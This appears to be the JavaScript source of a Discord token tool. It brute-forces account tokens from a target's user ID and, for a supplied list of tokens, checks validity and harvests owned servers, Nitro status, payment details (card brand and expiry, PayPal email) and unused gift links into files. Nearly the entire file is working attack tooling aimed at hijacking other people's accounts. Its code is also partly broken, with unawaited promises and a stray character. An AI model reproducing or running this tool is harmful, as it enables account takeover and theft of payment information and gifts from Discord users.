const request = require("request");
const fs = require("fs");
const askme = require('readline-sync');
const term = require("terminal-kit").terminal;
const fetch = require("node-fetch")

const config = require('./config.json');


var invalid = [];
var verified = [];
var unverified = [];

function maketoken(length) {
    var result = '';
    var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    var charactersLength = characters.length;
    for (var i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function ask() {
    console.log("\n")
    term.brightBlue(`Enter 1 to start brute forcing account right away with ID\n`);
    term.brightBlue(`Enter 2 to convert user's ID into half token and return\n`);
    term.brightBlue(`Enter 3 to generate a specific ammount of random tokens\n`);
    term.brightBlue(`Enter 4 to generate tokens of a specific user\n`);
    term.brightBlue(`Enter 5 to start mass token checker\n`);
    term.brightBlue(`Enter 6 to start advanced token payment, nitro gift, and more scrapper\n`);
    sel = askme.question("Enter option here: ");

    if (sel == 1) {
        id = askme.question("Enter user's ID here: ");
        let iddecrypt = Buffer.from(id).toString('base64')
        var settings = {
            timeout: config.timeout,
            do_not_touch: iddecrypt
        };
        fs.writeFileSync(__dirname + '/config.json', JSON.stringify(settings, null, 2));
        setInterval(() => {
            check();
        }, config.timeout);
    }
    if (sel == 2) {
        id = askme.question("Enter user's ID here: ");
        let iddecrypt = Buffer.from(id).toString('base64')
        console.log(iddecrypt)

    }
    if (sel == 3) {

    }
    if (sel == 4) {

    }
    if (sel == 5) {

    }
    if (sel == 6) {
        var tokens_to_check = fs.readFileSync('./tokens/tokens_to_check.txt', 'utf-8').replace(/\r/g, '').split('\n')


fs.writeFile(`./tokens/live++.txt`, '', (err, data) => { })
fs.writeFile(`./tokens/dead.txt`, '', (err, data) => { })

function start() {
    console.clear()
    for (i = 0; i < tokens_to_check.length; i++) {
         sleep(500)
        checkadvanced(tokens_to_check[i])
    }
}

function checkadvanced(token) {
    var guilds = ""
    var nitro = "none"
    var payment = ""
    var res = fetch("https://discord.com/api/v8/users/@me/guilds", {
        method: "GET",
        headers: {
            "authorization": token,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)
    if (res.message === "401: Unauthorized") {
        term.brightRed(token + " is invalid...\n")
        return fs.appendFile(`./tokens/dead.txt`, token + " is invalid...\n", (err, data) => { })
    }

    if (res.message === "You need to verify your account in order to perform this action.") {
        term.brightYellow(token + " is unverified, operation unsuccessful...\n")
        return fs.appendFile(`./tokens/dead.txt`, token + " is unverified, operation unsuccessful...\n", (err, data) => { })
    }

     res.map(a => {
        if (a.owner === true) {
            guilds += `[${a.name}] `
        }
    })

n 
    var res2 =  fetch(`https://discord.com/api/v8/users/@me`, {
        method: "GET",
        headers: {
            "authorization": token,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)

    if (res2.premium_type) {
        switch (res2.premium_type) {
            case 1:
                nitro = "Classic"
                break;
            case 2:
                nitro = "Gaming"
                break;
        }
    }

    var res3 =  fetch(`https://discord.com/api/v8/users/@me/billing/payment-sources`, {
        method: "GET",
        headers: {
            "authorization": token,
            "content-type": "application/json"
        }
    }).then(resp => resp.json())

    if (res3.length != 0) {
         res3.map(a => {
            switch (a.type) {
                case 1:
                    payment += "Card info:" + a.brand.toUpperCase() + "|" + a.expires_month/a.expires_year
                    break;
                case 2:
                    payment += "Paypal: " + a.email 
                    break;
            }
        })
    } else {
        payment = " No payment info..."
    }

    var res4 =  fetch(`https://discord.com/api/v8/users/@me/entitlements/gifts`, {
        method: "GET",
        headers: {
            "authorization": token,
            "content-type": "application/json"
        }
    }).then(resp => resp.json()).catch(() => console.error)

    if (res4.length === 0) {
        return fulllog(`Live: ${token} | Owned Guilds: ${guilds} | Nitro: ${nitro} | Payments: ${payment} | Gifts: No gifts`)
    }

     res4.map( a => {
        if (a.sku_id) {
            gift(a.sku_id, a.subscription_plan.id)
        }
    })

     function gift(sku_id, id) {
        var gift = ""
        var res5 =  fetch(`https://discord.com/api/v8/users/@me/entitlements/gift-codes?sku_id=${sku_id}&subscription_plan_id=${id}`, {
            method: "GET",
            headers: {
                "authorization": token,
                "content-type": "application/json"
            }
        }).then(resp => resp.json()).catch(() => console.error)
         res5.map(a => {
            if (a.uses === 0) {
                gift += `https://discord.gift/${a.code} `
            }

        })

        fulllog(`Live: ${token} | Owned Guilds: ${guilds} | Nitro: ${nitro} | Payments: ${payment} | Gifts: ${gift}`)

    }

     function fulllog(message) {
        term.brightGreen(message)
        return fs.appendFile(`./tokens/live++.txt`, `${message}\n`, (err, data) => { })
    }




}

start()

function sleep(duration) {
    return new Promise((resolve, reject) => {
        setTimeout(() => resolve(), duration);
    });
}

    }
}

function check() {
    var token1 = config.do_not_touch
    var token2 = maketoken(6)
    var token3 = maketoken(27)
    var fulltoken = token1 + '.' + token2 + '.' + token3
    
    request({
        method: "GET",
        url: "https://discordapp.com/api/v7/users/@me",
        headers: {
            authorization: fulltoken
        }
    }, (error, response, body) => {
        if (!body) return;
        var json = JSON.parse(body);
        if (!json.id) {
            invalid.push(fulltoken);
            term.brightRed(fulltoken + " is invalid...\n"), (err) => {
                if (err) throw err;
            };
        } else if (!json.verified) {
            unverified.push(fulltoken);
            term.brightGreen(fulltoken + " is valid!\n"), (err) => {

                if (err) throw err;
            };
        } else {
            verified.push(fulltoken);
            term.brightYellow(fulltoken + " the validity of this token is unknown :/\n"), (err) => {
                if (err) throw err;
            };
        }

    });
}


ask();